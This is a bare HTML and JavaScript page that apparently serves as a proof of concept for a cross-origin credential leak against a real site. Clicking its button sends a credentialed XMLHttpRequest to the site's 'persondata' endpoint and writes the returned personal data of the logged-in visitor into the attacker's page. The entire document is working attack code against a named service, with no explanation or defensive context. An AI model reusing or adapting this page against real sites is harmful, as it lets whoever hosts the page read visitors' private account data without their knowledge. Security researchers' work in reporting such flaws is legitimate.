<!DOCTYPE html>
<html>
<body>
<div id="demo">
<h1> get data </h1>
<button type="button" onclick="loadDoc()">click me</button>
</div>
<script>
function loadDoc() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      document.getElementById("demo").innerHTML =
      this.responseText;
    }
  };
  xhttp.withCredentials=true;
  xhttp.open("GET","https://my.58.com/persondata?r=0.4390534747205548&PGTID=0d000000-0000-035c-3878-4b91e0d86b4b&ClickID=1&r=0.8473638001263023",true)
  xhttp.send();
}
</script>
</body>
</html>
